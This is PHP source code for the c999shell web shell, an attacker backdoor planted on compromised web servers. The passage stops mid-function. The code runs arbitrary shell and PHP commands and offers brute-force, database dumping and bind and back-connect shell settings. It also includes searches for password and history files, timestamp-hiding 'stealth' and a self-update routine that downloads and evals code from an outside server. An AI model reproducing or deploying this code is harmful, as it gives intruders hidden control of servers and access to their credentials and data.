<?php //Starting calls if (!function_exists("getmicrotime")) {function getmicrotime() { list($usec, $sec) = explode(" ", microtime());  return ((float)$usec + (float)$sec);}} error_reporting(5); @ignore_user_abort(TRUE); @set_magic_quotes_runtime(0); $win = strtolower(substr(PHP_OS,0,3)) == "win"; define("starttime",getmicrotime()); if (get_magic_quotes_gpc()) {if (!function_exists("strips")) { function strips(&$arr,$k="") {if (is_array($arr))  {foreach($arr as $k=-->$v) {if (strtoupper($k) != "GLOBALS") {strips($arr["$k"]);}}}
else {$arr = stripslashes($arr);}}} strips($GLOBALS);}
$_REQUEST = array_merge($_COOKIE,$_GET,$_POST);
foreach($_REQUEST as $k=>$v) {if (!isset($$k)) {$$k = $v;}}
$shver = "1.0 pre-release build #16"; //Current version
//CONFIGURATION AND SETTINGS
if (!empty($unset_surl)) {setcookie("c999sh_surl"); $surl = "";}
elseif (!empty($set_surl)) {$surl = $set_surl; setcookie("c999sh_surl",$surl);}
else {$surl = $_REQUEST["c999sh_surl"]; //Set this cookie for manual SURL
}
$surl_autofill_include = TRUE; //If TRUE then search variables with
                               //descriptors (URLs) and save it in SURL.
if ($surl_autofill_include and !$_REQUEST["c999sh_surl"]) {$include = "&"; foreach
(explode("&",getenv("QUERY_STRING")) as $v) {$v = explode("=",$v);
$name = urldecode($v[0]);
$value = urldecode($v[1]);
foreach (array("http://","https://","ssl://","ftp://","\\\\") as $needle) {
if (strpos($value,$needle) === 0) {
$includestr .= urlencode($name)."=".urlencode($value)."&";}}}
if ($_REQUEST["surl_autofill_include"]) {
$includestr .= "surl_autofill_include=1&";}}
if (empty($surl))
{
 $surl = "?".$includestr; //Self url
}
$surl = htmlspecialchars($surl);
$timelimit = 0; //time limit of execution this script over server quote
                //(seconds), 0 = unlimited.
//Authentication
$login = ""; //login
//DON'T FORGOT ABOUT PASSWORD!!!
$pass = ""; //password
$md5_pass = ""; //md5-cryped pass. if null, md5($pass)
$host_allow = array("*"); //array ("{mask}1","{mask}2",...), {mask} = IP or HOST e.g. array("192.168.0.*","127.0.0.1")
$login_txt = "Restricted area"; //http-auth message.
$accessdeniedmess = "<a href="\&quot;http://ccteam.ru/releases/c999shell\&quot;">c999shell v.".$shver."</a>: access denied";
$gzipencode = TRUE; //Encode with gzip?
$updatenow = FALSE; //If TRUE, update now (this variable will be FALSE)
$c999sh_updateurl = "http://ccteam.ru/update/c999shell/"; //Update server
$c999sh_sourcesurl = "http://ccteam.ru/files/c999sh_sources/"; //Sources-server
$filestealth = TRUE; //if TRUE, don't change modify- and access-time
$donated_html = "</pre>
<center><b>Owned by hacker</b></center>
<pre>";
/* If you publish free shell and you wish
add link to your site or any other information,
put here your html. */
$donated_act = array(""); //array ("act1","act2,"...), if $act is in this array, display $donated_html.
$curdir = "./"; //start folder
//$curdir = getenv("DOCUMENT_ROOT");
$tmpdir = ""; //Folder for tempory files. If empty, auto-fill (/tmp or %WINDIR/temp)
$tmpdir_log = "./"; //Directory logs of long processes (e.g. brute, scan...)
$log_email = "user@host.tld"; //Default e-mail for sending logs
$sort_default = "0a"; //Default sorting, 0 - number of colomn, "a"scending or "d"escending
$sort_save = TRUE; //If TRUE then save sorting-position using cookies.
// Registered file-types.
//  array(
//   "{action1}"=>array("ext1","ext2","ext3",...),
//   "{action2}"=>array("ext4","ext5","ext6",...),
//   ...
//  )
$ftypes  = array(
 "html"=>array("html","htm","shtml"),
 "txt"=>array("txt","conf","bat","sh","js","bak","doc","log","sfc","cfg","htaccess"),
 "exe"=>array("sh","install","bat","cmd"),
 "ini"=>array("ini","inf"),
 "code"=>array("php","phtml","php3","php4","inc","tcl","h","c","cpp","py","cgi","pl"),
 "img"=>array("gif","png","jpeg","jfif","jpg","jpe","bmp","ico","tif","tiff","avi","mpg","mpeg"),
 "sdb"=>array("sdb"),
 "phpsess"=>array("sess"),
 "download"=>array("exe","com","pif","src","lnk","zip","rar","gz","tar")
);
// Registered executable file-types.
//  array(
//   string "command{i}"=>array("ext1","ext2","ext3",...),
//   ...
//  )
//   {command}: %f% = filename
$exeftypes  = array(
 getenv("PHPRC")." -q %f%" => array("php","php3","php4"),
 "perl %f%" => array("pl","cgi")
);
/* Highlighted files.
  array(
   i=>array({regexp},{type},{opentag},{closetag},{break})
   ...
  )
  string {regexp} - regular exp.
  int {type}:
0 - files and folders (as default),
1 - files only, 2 - folders only
  string {opentag} - open html-tag, e.g. "<b>" (default)
  string {closetag} - close html-tag, e.g. "</b>" (default)
  bool {break} - if TRUE and found match then break
*/
$regxp_highlight  = array(
  array(basename($_SERVER["PHP_SELF"]),1,"</pre>
<span>","</span>
<pre>"), // example
  array("config.php",1) // example
);
$safemode_diskettes = array("a"); // This variable for disabling diskett-errors.
 // array (i=>{letter} ...); string {letter} - letter of a drive
//$safemode_diskettes = range("a","z");
$hexdump_lines = 8;// lines in hex preview file
$hexdump_rows = 24;// 16, 24 or 32 bytes in one line
$nixpwdperpage = 100; // Get first N lines from /etc/passwd
$bindport_pass = "c999";  // default password for binding
$bindport_port = "31373"; // default port for binding
$bc_port = "31373"; // default port for back-connect
$datapipe_localport = "8081"; // default port for datapipe
// Command-aliases
if (!$win)
{
 $cmdaliases = array(
  array("-----------------------------------------------------------", "ls -la"),
  array("find all suid files", "find / -type f -perm -04000 -ls"),
  array("find suid files in current dir", "find . -type f -perm -04000 -ls"),
  array("find all sgid files", "find / -type f -perm -02000 -ls"),
  array("find sgid files in current dir", "find . -type f -perm -02000 -ls"),
  array("find config.inc.php files", "find / -type f -name config.inc.php"),
  array("find config* files", "find / -type f -name \"config*\""),
  array("find config* files in current dir", "find . -type f -name \"config*\""),
  array("find all writable folders and files", "find / -perm -2 -ls"),
  array("find all writable folders and files in current dir", "find . -perm -2 -ls"),
  array("find all service.pwd files", "find / -type f -name service.pwd"),
  array("find service.pwd files in current dir", "find . -type f -name service.pwd"),
  array("find all .htpasswd files", "find / -type f -name .htpasswd"),
  array("find .htpasswd files in current dir", "find . -type f -name .htpasswd"),
  array("find all .bash_history files", "find / -type f -name .bash_history"),
  array("find .bash_history files in current dir", "find . -type f -name .bash_history"),
  array("find all .fetchmailrc files", "find / -type f -name .fetchmailrc"),
  array("find .fetchmailrc files in current dir", "find . -type f -name .fetchmailrc"),
  array("list file attributes on a Linux second extended file system", "lsattr -va"),
  array("show opened ports", "netstat -an | grep -i listen")
 );
}
else
{
 $cmdaliases = array(
  array("-----------------------------------------------------------", "dir"),
  array("show opened ports", "netstat -an")
 );
}
$sess_cookie = "c999shvars"; // Cookie-variable name
$usefsbuff = TRUE; //Buffer-function
$copy_unset = FALSE; //Remove copied files from buffer after pasting
//Quick launch
$quicklaunch = array(
 array("<img alt="\&quot;Home\&quot;" src="\&quot;&quot;.$surl.&quot;act=img&img=home\&quot;" width="\&quot;20\&quot;" height="\&quot;20\&quot;" border="\&quot;0\&quot;" />",$surl),
 array("<img alt="\&quot;Back\&quot;" src="\&quot;&quot;.$surl.&quot;act=img&img=back\&quot;" width="\&quot;20\&quot;" height="\&quot;20\&quot;" border="\&quot;0\&quot;" />","#\" onclick=\"history.back(1)"),
 array("<img alt="\&quot;Forward\&quot;" src="\&quot;&quot;.$surl.&quot;act=img&img=forward\&quot;" width="\&quot;20\&quot;" height="\&quot;20\&quot;" border="\&quot;0\&quot;" />","#\" onclick=\"history.go(1)"),
 array("<img alt="\&quot;UPDIR\&quot;" src="\&quot;&quot;.$surl.&quot;act=img&img=up\&quot;" width="\&quot;20\&quot;" height="\&quot;20\&quot;" border="\&quot;0\&quot;" />",$surl."act=ls&d=%upd&sort=%sort"),
 array("<img alt="\&quot;Refresh\&quot;" src="\&quot;&quot;.$surl.&quot;act=img&img=refresh\&quot;" width="\&quot;17\&quot;" height="\&quot;20\&quot;" border="\&quot;0\&quot;" />",""),
 array("<img alt="\&quot;Search\&quot;" src="\&quot;&quot;.$surl.&quot;act=img&img=search\&quot;" width="\&quot;20\&quot;" height="\&quot;20\&quot;" border="\&quot;0\&quot;" />",$surl."act=search&d=%d"),
 array("<img alt="\&quot;Buffer\&quot;" src="\&quot;&quot;.$surl.&quot;act=img&img=buffer\&quot;" width="\&quot;20\&quot;" height="\&quot;20\&quot;" border="\&quot;0\&quot;" />",$surl."act=fsbuff&d=%d"),
 array("<b>Encoder</b>",$surl."act=encoder&d=%d"),
 array("<b>Tools</b>",$surl."act=tools&d=%d"),
 array("<b>Proc.</b>",$surl."act=processes&d=%d"),
 array("<b>FTP brute</b>",$surl."act=ftpquickbrute&d=%d"),
 array("<b>Sec.</b>",$surl."act=security&d=%d"),
 array("<b>SQL</b>",$surl."act=sql&d=%d"),
 array("<b>PHP-code</b>",$surl."act=eval&d=%d"),
 array("<b>Update</b>",$surl."act=update&d=%d"),
 array("<b>Feedback</b>",$surl."act=feedback&d=%d"),
 array("<b>Self remove</b>",$surl."act=selfremove"),
 array("<b>Logout</b>","#\" onclick=\"if (confirm('Are you sure?')) window.close()")
);
//Highlight-code colors
$highlight_background = "#c0c0c0";
$highlight_bg = "#FFFFFF";
$highlight_comment = "#6A6A6A";
$highlight_default = "#0000BB";
$highlight_html = "#1300FF";
$highlight_keyword = "#007700";
$highlight_string = "#000000";
@$f = $_REQUEST["f"];
@extract($_REQUEST["c999shcook"]);
//END CONFIGURATION
// \/Next code isn't for editing\/
@set_time_limit(0);
$tmp = array();
foreach($host_allow as $k=>$v) {$tmp[] = str_replace("\\*",".*",preg_quote($v));}
$s = "!^(".implode("|",$tmp).")$!i";
if (!preg_match($s,getenv("REMOTE_ADDR")) and !preg_match($s,gethostbyaddr(getenv("REMOTE_ADDR")))) {exit("<a href="\&quot;http://ccteam.ru/releases/cc999shell\&quot;">c999shell</a>: Access Denied - your host (".getenv("REMOTE_ADDR").") not allow");}
if (!empty($login))
{
 if (empty($md5_pass)) {$md5_pass = md5($pass);}
 if (($_SERVER["PHP_AUTH_USER"] != $login) or (md5($_SERVER["PHP_AUTH_PW"]) != $md5_pass))
 {
  if (empty($login_txt)) {$login_txt = strip_tags(ereg_replace(" |
"," ",$donated_html));}
  header("WWW-Authenticate: Basic realm=\"c999shell ".$shver.": ".$login_txt."\"");
  header("HTTP/1.0 401 Unauthorized");
  exit($accessdeniedmess);
 }
}
if ($act != "img")
{
$lastdir = realpath(".");
chdir($curdir);
if ($selfwrite or $updatenow) {@ob_clean(); c999sh_getupdate($selfwrite,1); exit;}
$sess_data = unserialize($_COOKIE["$sess_cookie"]);
if (!is_array($sess_data)) {$sess_data = array();}
if (!is_array($sess_data["copy"])) {$sess_data["copy"] = array();}
if (!is_array($sess_data["cut"])) {$sess_data["cut"] = array();}
$disablefunc = @ini_get("disable_functions");
if (!empty($disablefunc))
{
 $disablefunc = str_replace(" ","",$disablefunc);
 $disablefunc = explode(",",$disablefunc);
}
if (!function_exists("c999_buff_prepare"))
{
function c999_buff_prepare()
{
 global $sess_data;
 global $act;
 foreach($sess_data["copy"] as $k=>$v) {$sess_data["copy"][$k] = str_replace("\\",DIRECTORY_SEPARATOR,realpath($v));}
 foreach($sess_data["cut"] as $k=>$v) {$sess_data["cut"][$k] = str_replace("\\",DIRECTORY_SEPARATOR,realpath($v));}
 $sess_data["copy"] = array_unique($sess_data["copy"]);
 $sess_data["cut"] = array_unique($sess_data["cut"]);
 sort($sess_data["copy"]);
 sort($sess_data["cut"]);
 if ($act != "copy") {foreach($sess_data["cut"] as $k=>$v) {if ($sess_data["copy"][$k] == $v) {unset($sess_data["copy"][$k]); }}}
 else {foreach($sess_data["copy"] as $k=>$v) {if ($sess_data["cut"][$k] == $v) {unset($sess_data["cut"][$k]);}}}
}
}
c999_buff_prepare();
if (!function_exists("c999_sess_put"))
{
function c999_sess_put($data)
{
 global $sess_cookie;
 global $sess_data;
 c999_buff_prepare();
 $sess_data = $data;
 $data = serialize($data);
 setcookie($sess_cookie,$data);
}
}
foreach (array("sort","sql_sort") as $v)
{
 if (!empty($_GET[$v])) {$$v = $_GET[$v];}
 if (!empty($_POST[$v])) {$$v = $_POST[$v];}
}
if ($sort_save)
{
 if (!empty($sort)) {setcookie("sort",$sort);}
 if (!empty($sql_sort)) {setcookie("sql_sort",$sql_sort);}
}
if (!function_exists("str2mini"))
{
function str2mini($content,$len)
{
 if (strlen($content) > $len)
 {
  $len = ceil($len/2) - 2;
  return substr($content, 0,$len)."...".substr($content,-$len);
 }
 else {return $content;}
}
}
if (!function_exists("view_size"))
{
function view_size($size)
{
 if (!is_numeric($size)) {return FALSE;}
 else
 {
  if ($size >= 1073741824) {$size = round($size/1073741824*100)/100 ." GB";}
  elseif ($size >= 1048576) {$size = round($size/1048576*100)/100 ." MB";}
  elseif ($size >= 1024) {$size = round($size/1024*100)/100 ." KB";}
  else {$size = $size . " B";}
  return $size;
 }
}
}
if (!function_exists("fs_copy_dir"))
{
function fs_copy_dir($d,$t)
{
 $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
 if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
 $h = opendir($d);
 while (($o = readdir($h)) !== FALSE)
 {
  if (($o != ".") and ($o != ".."))
  {
   if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
   else {$ret = mkdir($t.DIRECTORY_SEPARATOR.$o); fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
   if (!$ret) {return $ret;}
  }
 }
 closedir($h);
 return TRUE;
}
}
if (!function_exists("fs_copy_obj"))
{
function fs_copy_obj($d,$t)
{
 $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
 $t = str_replace("\\",DIRECTORY_SEPARATOR,$t);
 if (!is_dir(dirname($t))) {mkdir(dirname($t));}
 if (is_dir($d))
 {
  if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
  if (substr($t,-1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;}
  return fs_copy_dir($d,$t);
 }
 elseif (is_file($d)) {return copy($d,$t);}
 else {return FALSE;}
}
}
if (!function_exists("fs_move_dir"))
{
function fs_move_dir($d,$t)
{
 $h = opendir($d);
 if (!is_dir($t)) {mkdir($t);}
 while (($o = readdir($h)) !== FALSE)
 {
  if (($o != ".") and ($o != ".."))
  {
   $ret = TRUE;
   if (!is_dir($d.DIRECTORY_SEPARATOR.$o)) {$ret = copy($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o);}
   else {if (mkdir($t.DIRECTORY_SEPARATOR.$o) and fs_copy_dir($d.DIRECTORY_SEPARATOR.$o,$t.DIRECTORY_SEPARATOR.$o)) {$ret = FALSE;}}
   if (!$ret) {return $ret;}
  }
 }
 closedir($h);
 return TRUE;
}
}
if (!function_exists("fs_move_obj"))
{
function fs_move_obj($d,$t)
{
 $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
 $t = str_replace("\\",DIRECTORY_SEPARATOR,$t);
 if (is_dir($d))
 {
  if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
  if (substr($t,-1) != DIRECTORY_SEPARATOR) {$t .= DIRECTORY_SEPARATOR;}
  return fs_move_dir($d,$t);
 }
 elseif (is_file($d))
 {
  if(copy($d,$t)) {return unlink($d);}
  else {unlink($t); return FALSE;}
 }
 else {return FALSE;}
}
}
if (!function_exists("fs_rmdir"))
{
function fs_rmdir($d)
{
 $h = opendir($d);
 while (($o = readdir($h)) !== FALSE)
 {
  if (($o != ".") and ($o != ".."))
  {
   if (!is_dir($d.$o)) {unlink($d.$o);}
   else {fs_rmdir($d.$o.DIRECTORY_SEPARATOR); rmdir($d.$o);}
  }
 }
 closedir($h);
 rmdir($d);
 return !is_dir($d);
}
}
if (!function_exists("fs_rmobj"))
{
function fs_rmobj($o)
{
 $o = str_replace("\\",DIRECTORY_SEPARATOR,$o);
 if (is_dir($o))
 {
  if (substr($o,-1) != DIRECTORY_SEPARATOR) {$o .= DIRECTORY_SEPARATOR;}
  return fs_rmdir($o);
 }
 elseif (is_file($o)) {return unlink($o);}
 else {return FALSE;}
}
}
if (!function_exists("myshellexec"))
{
function myshellexec($cmd)
{
 global $disablefunc;
 $result = "";
 if (!empty($cmd))
 {
  if (is_callable("exec") and !in_array("exec",$disablefunc)) {exec($cmd,$result); $result = join("\n",$result);}
  elseif (($result = `$cmd`) !== FALSE) {}
  elseif (is_callable("system") and !in_array("system",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
  elseif (is_callable("passthru") and !in_array("passthru",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); passthru($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
  elseif (is_resource($fp = popen($cmd,"r")))
  {
   $result = "";
   while(!feof($fp)) {$result .= fread($fp,1024);}
   pclose($fp);
  }
 }
 return $result;
}
}
if (!function_exists("tabsort")) {function tabsort($a,$b) {global $v; return strnatcmp($a[$v], $b[$v]);}}
if (!function_exists("view_perms"))
{
function view_perms($mode)
{
 if (($mode & 0xC000) === 0xC000) {$type = "s";}
 elseif (($mode & 0x4000) === 0x4000) {$type = "d";}
 elseif (($mode & 0xA000) === 0xA000) {$type = "l";}
 elseif (($mode & 0x8000) === 0x8000) {$type = "-";}
 elseif (($mode & 0x6000) === 0x6000) {$type = "b";}
 elseif (($mode & 0x2000) === 0x2000) {$type = "c";}
 elseif (($mode & 0x1000) === 0x1000) {$type = "p";}
 else {$type = "?";}
 $owner["read"] = ($mode & 00400)?"r":"-";
 $owner["write"] = ($mode & 00200)?"w":"-";
 $owner["execute"] = ($mode & 00100)?"x":"-";
 $group["read"] = ($mode & 00040)?"r":"-";
 $group["write"] = ($mode & 00020)?"w":"-";
 $group["execute"] = ($mode & 00010)?"x":"-";
 $world["read"] = ($mode & 00004)?"r":"-";
 $world["write"] = ($mode & 00002)? "w":"-";
 $world["execute"] = ($mode & 00001)?"x":"-";
 if ($mode & 0x800) {$owner["execute"] = ($owner["execute"] == "x")?"s":"S";}
 if ($mode & 0x400) {$group["execute"] = ($group["execute"] == "x")?"s":"S";}
 if ($mode & 0x200) {$world["execute"] = ($world["execute"] == "x")?"t":"T";}
 return $type.join("",$owner).join("",$group).join("",$world);
}
}
if (!function_exists("posix_getpwuid") and !in_array("posix_getpwuid",$disablefunc)) {function posix_getpwuid($uid) {return FALSE;}}
if (!function_exists("posix_getgrgid") and !in_array("posix_getgrgid",$disablefunc)) {function posix_getgrgid($gid) {return FALSE;}}
if (!function_exists("posix_kill") and !in_array("posix_kill",$disablefunc)) {function posix_kill($gid) {return FALSE;}}
if (!function_exists("parse_perms"))
{
function parse_perms($mode)
{
 if (($mode & 0xC000) === 0xC000) {$t = "s";}
 elseif (($mode & 0x4000) === 0x4000) {$t = "d";}
 elseif (($mode & 0xA000) === 0xA000) {$t = "l";}
 elseif (($mode & 0x8000) === 0x8000) {$t = "-";}
 elseif (($mode & 0x6000) === 0x6000) {$t = "b";}
 elseif (($mode & 0x2000) === 0x2000) {$t = "c";}
 elseif (($mode & 0x1000) === 0x1000) {$t = "p";}
 else {$t = "?";}
 $o["r"] = ($mode & 00400) > 0; $o["w"] = ($mode & 00200) > 0; $o["x"] = ($mode & 00100) > 0;
 $g["r"] = ($mode & 00040) > 0; $g["w"] = ($mode & 00020) > 0; $g["x"] = ($mode & 00010) > 0;
 $w["r"] = ($mode & 00004) > 0; $w["w"] = ($mode & 00002) > 0; $w["x"] = ($mode & 00001) > 0;
 return array("t"=>$t,"o"=>$o,"g"=>$g,"w"=>$w);
}
}
if (!function_exists("parsesort"))
{
function parsesort($sort)
{
 $one = intval($sort);
 $second = substr($sort,-1);
 if ($second != "d") {$second = "a";}
 return array($one,$second);
}
}
if (!function_exists("view_perms_color"))
{
function view_perms_color($o)
{
 if (!is_readable($o)) {return "</pre>
<span style="color: red;">".view_perms(fileperms($o))."</span>
<pre>";}
 elseif (!is_writable($o)) {return "</pre>
<span style="color: white;">".view_perms(fileperms($o))."</span>
<pre>";}
 else {return "</pre>
<span style="color: green;">".view_perms(fileperms($o))."</span>
<pre>";}
}
}
if (!function_exists("c999getsource"))
{
function c999getsource($fn)
{
 global $c999sh_sourcesurl;
 $array = array(
  "c999sh_bindport.pl" => "c999sh_bindport_pl.txt",
  "c999sh_bindport.c" => "c999sh_bindport_c.txt",
  "c999sh_backconn.pl" => "c999sh_backconn_pl.txt",
  "c999sh_backconn.c" => "c999sh_backconn_c.txt",
  "c999sh_datapipe.pl" => "c999sh_datapipe_pl.txt",
  "c999sh_datapipe.c" => "c999sh_datapipe_c.txt",
 );
 $name = $array[$fn];
 if ($name) {return file_get_contents($c999sh_sourcesurl.$name);}
 else {return FALSE;}
}
}
if (!function_exists("c999sh_getupdate"))
{
function c999sh_getupdate($update = TRUE)
{
 $url = $GLOBALS["c999sh_updateurl"]."?version=".urlencode(base64_encode($GLOBALS["shver"]))."&updatenow=".($updatenow?"1":"0")."&";
 $data = @file_get_contents($url);
 if (!$data) {return "Can't connect to update-server!";}
 else
 {
  $data = ltrim($data);
  $string = substr($data,3,ord($data{2}));
  if ($data{0} == "\x99" and $data{1} == "\x01") {return "Error: ".$string; return FALSE;}
  if ($data{0} == "\x99" and $data{1} == "\x02") {return "You are using latest version!";}
  if ($data{0} == "\x99" and $data{1} == "\x03")
  {
   $string = explode("\x01",$string);
   if ($update)
   {
    $confvars = array();
    $sourceurl = $string[0];
    $source = file_get_contents($sourceurl);
    if (!$source) {return "Can't fetch update!";}
    else
    {
     $fp = fopen(__FILE__,"w");
     if (!$fp) {return "Local error: can't write update to ".__FILE__."! You may download c999shell.php manually <a href="\&quot;&quot;.$sourceurl.&quot;\&quot;"><span style="text-decoration: underline;">here</span></a>.";}
     else {fwrite($fp,$source); fclose($fp); return "Thanks! Updated with success.";}
    }
   }
   else {return "New version are available: ".$string[1];}
  }
  elseif ($data{0} == "\x99" and $data{1} == "\x04") {eval($string); return 1;}
  else {return "Error in protocol: segmentation failed! (".$data.") ";}
 }
}
}
if (!function_exists("mysql_dump"))
{
function mysql_dump($set)
{
 global $shver;
 $sock = $set["sock"];
 $db = $set["db"];
 $print = $set["print"];
 $nl2br = $set["nl2br"];
 $file = $set["file"];
 $add_drop = $set["add_drop"];
 $tabs = $set["tabs"];
 $onlytabs = $set["onlytabs"];
 $ret = array();
 $ret["err"] = array();
 if (!is_resource($sock)) {echo("Error: \$sock is not valid resource.");}
 if (empty($db)) {$db = "db";}
 if (empty($print)) {$print = 0;}
 if (empty($nl2br)) {$nl2br = 0;}
 if (empty($add_drop)) {$add_drop = TRUE;}
 if (empty($file))
 {
  $file = $tmpdir."dump_".getenv("SERVER_NAME")."_".$db."_".date("d-m-Y-H-i-s").".sql";
 }
 if (!is_array($tabs)) {$tabs = array();}
 if (empty($add_drop)) {$add_drop = TRUE;}
 if (sizeof($tabs) == 0)
 {
  // retrive tables-list
  $res = mysql_query("SHOW TABLES FROM ".$db, $sock);
  if (mysql_num_rows($res) > 0) {while ($row = mysql_fetch_row($res)) {$tabs[] = $row[0];}}
 }
 $out = "# Dumped by c999Shell.SQL v. ".$shver."
# Home page: http://ccteam.ru
#
# Host settings:
# MySQL version: (".mysql_get_server_info().") running on ".getenv("SERVER_ADDR")." (".getenv("SERVER_NAME").")"."
# Date: ".date("d.m.Y H:i:s")."
# DB: \"".$db."\"
#---------------------------------------------------------
";
 $c = count($onlytabs);
 foreach($tabs as $tab)
 {
  if ((in_array($tab,$onlytabs)) or (!$c))
  {
   if ($add_drop) {$out .= "DROP TABLE IF EXISTS `".$tab."`;\n";}
   // recieve query for create table structure
   $res = mysql_query("SHOW CREATE TABLE `".$tab."`", $sock);
   if (!$res) {$ret["err"][] = mysql_smarterror();}
   else
   {
    $row = mysql_fetch_row($res);
    $out .= $row["1"].";\n\n";
    // recieve table variables
    $res = mysql_query("SELECT * FROM `$tab`", $sock);
    if (mysql_num_rows($res) > 0)
    {
     while ($row = mysql_fetch_assoc($res))
     {
      $keys = implode("`, `", array_keys($row));
      $values = array_values($row);
      foreach($values as $k=>$v) {$values[$k] = addslashes($v);}
      $values = implode("', '", $values);
      $sql = "INSERT INTO `$tab`(`".$keys."`) VALUES ('".$values."');\n";
      $out .= $sql;
     }
    }
   }
  }
 }
 $out .= "#---------------------------------------------------------------------------------\n\n";
 if ($file)
 {
  $fp = fopen($file, "w");
  if (!$fp) {$ret["err"][] = 2;}
  else
  {
   fwrite ($fp, $out);
   fclose ($fp);
  }
 }
 if ($print) {if ($nl2br) {echo nl2br($out);} else {echo $out;}}
 return $out;
}
}
if (!function_exists("mysql_buildwhere"))
{
function mysql_buildwhere($array,$sep=" and",$functs=array())
{
 if (!is_array($array)) {$array = array();}
 $result = "";
 foreach($array as $k=>$v)
 {
  $value = "";
  if (!empty($functs[$k])) {$value .= $functs[$k]."(";}
  $value .= "'".addslashes($v)."'";
  if (!empty($functs[$k])) {$value .= ")";}
  $result .= "`".$k."` = ".$value.$sep;
 }
 $result = substr($result,0,strlen($result)-strlen($sep));
 return $result;
}
}
if (!function_exists("mysql_fetch_all"))
{
function mysql_fetch_all($query,$sock)
{
 if ($sock) {$result = mysql_query($query,$sock);}
 else {$result = mysql_query($query);}
 $array = array();
 while ($row = mysql_fetch_array($result)) {$array[] = $row;}
 mysql_free_result($result);
 return $array;
}
}
if (!function_exists("mysql_smarterror"))
{
function mysql_smarterror($type,$sock)
{
 if ($sock) {$error = mysql_error($sock);}
 else {$error = mysql_error();}
 $error = htmlspecialchars($error);
 return $error;
}
}
if (!function_exists("mysql_query_form"))
{
function mysql_query_form()
{
 global $submit,$sql_act,$sql_query,$sql_query_result,$sql_confirm,$sql_query_error,$tbl_struct;
 if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b>
".$sql_query_error."
";}
 if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}
 if ((!$submit) or ($sql_act))
 {
  echo "</pre>
"; if ($tbl_struct) { echo "
<table border="0">
<tbody>
<tr>
<td><form method="POST" name="\&quot;c999sh_sqlquery\&quot;"><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to";} else {echo "SQL-Query";} echo ":</b>

<textarea cols="100" name="sql_query" rows="10">".htmlspecialchars($sql_query)."</textarea>

<input type="hidden" name="act" value="sql" /><input type="hidden" name="sql_act" value="query" /><input type="hidden" name="sql_tbl" value="\&quot;&quot;.htmlspecialchars($sql_tbl).&quot;\&quot;" /><input type="hidden" name="submit" value="\&quot;1\&quot;" /><input type="hidden" name="\&quot;sql_goto\&quot;" value="\&quot;&quot;.htmlspecialchars($sql_goto).&quot;\&quot;" /><input type="submit" name="sql_confirm" value="\&quot;Yes\&quot;" /> <input type="submit" value="\&quot;No\&quot;" /></form></td>
<td valign="\&quot;top\&quot;"><b>Fields:</b>
";
 foreach ($tbl_struct as $field) {$name = $field["Field"]; echo "� <a onclick="\&quot;document.c999sh_sqlquery.sql_query.value+='`&quot;.$name.&quot;`';\&quot;" href="\&quot;#\&quot;"><b>".$name."</b></a>
";}
 echo "</td>
</tr>
</tbody>
</table>
<pre>
";
 }
 }
 if ($sql_query_result or (!$sql_confirm)) {$sql_query = $sql_last_query;}
}
}
if (!function_exists("mysql_create_db"))
{
function mysql_create_db($db,$sock="")
{
 $sql = "CREATE DATABASE `".addslashes($db)."`;";
 if ($sock) {return mysql_query($sql,$sock);}
 else {return mysql_query($sql);}
}
}
if (!function_exists("mysql_query_parse"))
{
function mysql_query_parse($query)
{
 $query = trim($query);
 $arr = explode (" ",$query);
 /*array array()
 {
 "METHOD"=>array(output_type),
 "METHOD1"...
 ...
 }
 if output_type == 0, no output,
 if output_type == 1, no output if no error
 if output_type == 2, output without control-buttons
 if output_type == 3, output with control-buttons
 */
 $types = array(
 "SELECT"=>array(3,1),
 "SHOW"=>array(2,1),
 "DELETE"=>array(1),
 "DROP"=>array(1)
 );
 $result = array();
 $op = strtoupper($arr[0]);
 if (is_array($types[$op]))
 {
 $result["propertions"] = $types[$op];
 $result["query"] = $query;
 if ($types[$op] == 2)
 {
 foreach($arr as $k=>$v)
 {
 if (strtoupper($v) == "LIMIT")
 {
 $result["limit"] = $arr[$k+1];
 $result["limit"] = explode(",",$result["limit"]);
 if (count($result["limit"]) == 1) {$result["limit"] = array(0,$result["limit"][0]);}
 unset($arr[$k],$arr[$k+1]);
 }
 }
 }
 }
 else {return FALSE;}
}
}
if (!function_exists("c999fsearch"))
{
function c999fsearch($d)
{
 global $found;
 global $found_d;
 global $found_f;
 global $search_i_f;
 global $search_i_d;
 global $a;
 if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
 $h = opendir($d);
 while (($f = readdir($h)) !== FALSE)
 {
 if($f != "." && $f != "..")
 {
 $bool = (empty($a["name_regexp"]) and strpos($f,$a["name"]) !== FALSE) || ($a["name_regexp"] and ereg($a["name"],$f));
 if (is_dir($d.$f))
 {
 $search_i_d++;
 if (empty($a["text"]) and $bool) {$found[] = $d.$f; $found_d++;}
 if (!is_link($d.$f)) {c999fsearch($d.$f);}
 }
 else
 {
 $search_i_f++;
 if ($bool)
 {
 if (!empty($a["text"]))
 {
 $r = @file_get_contents($d.$f);
 if ($a["text_wwo"]) {$a["text"] = " ".trim($a["text"])." ";}
 if (!$a["text_cs"]) {$a["text"] = strtolower($a["text"]); $r = strtolower($r);}
 if ($a["text_regexp"]) {$bool = ereg($a["text"],$r);}
 else {$bool = strpos(" ".$r,$a["text"],1);}
